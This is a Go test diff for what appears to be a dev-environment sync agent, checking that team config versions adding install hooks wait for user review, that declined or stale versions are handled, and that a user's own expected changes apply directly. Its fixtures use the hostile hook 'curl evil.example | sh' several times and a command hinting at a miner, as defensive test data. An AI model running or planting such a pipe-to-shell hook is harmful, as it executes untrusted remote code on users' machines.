@@ -5,6 +5,7 @@ import (
 	"errors"
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 
 	agentv2 "github.com/amalychev/devopus/gen/devopus/agent/v2"
@@ -280,5 +281,89 @@ func TestSyncServer(t *testing.T) {
 	}
 	if _, err := s.Link("local", "/x"); !errors.Is(err, ErrUnknownProject) {
 		t.Errorf("link of a folder's project: %v", err)
+	}
+}
+
+func TestRiskyVersionWaits(t *testing.T) {
+	s, err := Open(filepath.Join(t.TempDir(), "desired.json"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	root := func(name string) string { return "/data/projects/" + name }
+	v1 := "name: shop\ndomain: shop.localhost\napps:\n  api:\n    repo: git@x:acme/api.git\n    command: php -S 0.0.0.0:8080\nservices:\n  php:\n    type: php\n    version: \"8.3\"\n    apps: [api]\n"
+	sync := func(version int32, text string) *agentv2.ProjectSpec {
+		t.Helper()
+		if _, _, err := s.SyncServer("wsp_1", "admin@acme.dev", ServerKey{}, []ServerProject{{Name: "shop", Spec: []byte(text), Version: version}}, root); err != nil {
+			t.Fatal(err)
+		}
+		return s.Snapshot().Projects[0]
+	}
+
+	// The first version comes in as it is: that is joining the team.
+	if p := sync(1, v1); p.ConfigVersion != 1 || p.Pending != nil {
+		t.Fatalf("v1: %+v", p)
+	}
+	// A teamlead's everyday change applies at once.
+	v2 := strings.Replace(v1, `"8.3"`, `"8.4"`, 1)
+	if p := sync(2, v2); p.ConfigVersion != 2 || p.Pending != nil {
+		t.Fatalf("v2: %+v", p)
+	}
+	// A hook waits; the project keeps running v2.
+	v3 := strings.Replace(v2, "    command: php", "    hooks:\n      install: curl evil.example | sh\n    command: php", 1)
+	p := sync(3, v3)
+	if p.ConfigVersion != 2 || string(p.Spec) != v2 || p.Pending == nil || p.Pending.Version != 3 ||
+		len(p.Pending.Risky) != 1 || !strings.Contains(p.Pending.Risky[0], "apps.api.hooks") {
+		t.Fatalf("v3: %+v", p)
+	}
+	// Declined: kept, not asked again for the same version.
+	if _, err := s.ReviewChanges("shop", p.Pending.Hash, false); err != nil {
+		t.Fatal(err)
+	}
+	if p := sync(3, v3); p.ConfigVersion != 2 || p.Pending != nil {
+		t.Fatalf("declined v3: %+v", p)
+	}
+	// A newer version still has the hook: asked again.
+	v4 := strings.Replace(v3, "shop.localhost", "shop.test", 1)
+	p = sync(4, v4)
+	if p.Pending == nil || p.Pending.Version != 4 || len(p.Pending.Other) != 1 {
+		t.Fatalf("v4: %+v", p)
+	}
+	// Accepting another version than the one shown is refused.
+	if _, err := s.ReviewChanges("shop", "deadbeef", true); !errors.Is(err, ErrNoPending) {
+		t.Errorf("stale accept: %v", err)
+	}
+	if _, err := s.ReviewChanges("shop", p.Pending.Hash, true); err != nil {
+		t.Fatal(err)
+	}
+	if p := s.Snapshot().Projects[0]; p.ConfigVersion != 4 || string(p.Spec) != v4 || p.Pending != nil {
+		t.Fatalf("accepted v4: %+v", p)
+	}
+
+	// The user's own change applies without asking — only as they sent it.
+	if _, err := s.ExpectChange("shop", "apps.api", []byte("repo: git@x:acme/api.git\ncommand: php -S 0.0.0.0:9090\nhooks:\n  install: curl evil.example | sh\n")); err != nil {
+		t.Fatal(err)
+	}
+	v5 := strings.Replace(v4, "0.0.0.0:8080", "0.0.0.0:9090", 1)
+	if p := sync(5, v5); p.ConfigVersion != 5 || p.Pending != nil || len(p.Expected) != 0 {
+		t.Fatalf("own v5: %+v", p)
+	}
+	if _, err := s.ExpectChange("shop", "apps.api", []byte("repo: git@x:acme/api.git\ncommand: ./serve\n")); err != nil {
+		t.Fatal(err)
+	}
+	v6 := strings.Replace(v5, "php -S 0.0.0.0:9090", "./serve-and-mine", 1)
+	if p := sync(6, v6); p.ConfigVersion != 5 || p.Pending == nil {
+		t.Fatalf("v6 is not what the user sent: %+v", p)
+	}
+	// An expectation is the whole section as sent: one without the hook does not cover
+	// a version with it. The right one, coming after the version, applies it then.
+	v7 := strings.Replace(v5, "php -S 0.0.0.0:9090", "./serve", 1)
+	if p := sync(7, v7); p.Pending == nil || p.Pending.Version != 7 {
+		t.Fatalf("v7 before the expectation: %+v", p)
+	}
+	if _, err := s.ExpectChange("shop", "apps.api", []byte("repo: git@x:acme/api.git\ncommand: ./serve\nhooks:\n  install: curl evil.example | sh\n")); err != nil {
+		t.Fatal(err)
+	}
+	if p := s.Snapshot().Projects[0]; p.ConfigVersion != 7 || p.Pending != nil {
+		t.Fatalf("v7 after the expectation: %+v", p)
 	}
 }
